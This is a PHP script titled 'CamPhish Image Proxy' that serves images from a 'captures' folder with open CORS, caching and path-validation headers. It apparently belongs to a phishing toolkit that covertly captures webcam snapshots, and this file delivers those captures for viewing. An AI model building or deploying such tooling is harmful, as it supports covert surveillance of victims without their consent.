<?php
/**
 * CamPhish Image Proxy
 * Serves images from the captures directory with proper headers
 * Usage: image.php?file=cam20250205123456.png
 */

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle OPTIONS request for CORS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Get filename from query string
$filename = $_GET['file'] ?? '';

// Security: Validate filename
if (empty($filename)) {
    header('HTTP/1.1 400 Bad Request');
    die('No file specified');
}

// Security: Prevent directory traversal
if (strpos($filename, '..') !== false || strpos($filename, '/') !== false || strpos($filename, '\\') !== false) {
    header('HTTP/1.1 403 Forbidden');
    die('Invalid file path');
}

// Security: Only allow image files
if (!preg_match('/\.(png|jpg|jpeg|gif|webp)$/i', $filename)) {
    header('HTTP/1.1 403 Forbidden');
    die('Invalid file type');
}

// Build file path
$filepath = 'captures/' . $filename;

// Check if file exists
if (!file_exists($filepath)) {
    header('HTTP/1.1 404 Not Found');
    die('File not found: ' . htmlspecialchars($filename));
}

// Check if file is readable
if (!is_readable($filepath)) {
    header('HTTP/1.1 403 Forbidden');
    die('File not accessible');
}

// Get file info
$filesize = filesize($filepath);
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mimetype = finfo_file($finfo, $filepath);
finfo_close($finfo);

// If MIME type detection fails, use extension-based detection
if (!$mimetype || $mimetype === 'application/octet-stream') {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $mimeTypes = [
        'png' => 'image/png',
        'jpg' => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'gif' => 'image/gif',
        'webp' => 'image/webp'
    ];
    $mimetype = $mimeTypes[$ext] ?? 'application/octet-stream';
}

// Set headers
header('Content-Type: ' . $mimetype);
header('Content-Length: ' . $filesize);
header('Content-Disposition: inline; filename="' . $filename . '"');
header('Cache-Control: public, max-age=3600'); // Cache for 1 hour
header('Expires: ' . gmdate('D, d M Y H:i:s', time() + 3600) . ' GMT');

// Prevent script execution
header('X-Content-Type-Options: nosniff');

// Output file
readfile($filepath);
exit;
?>
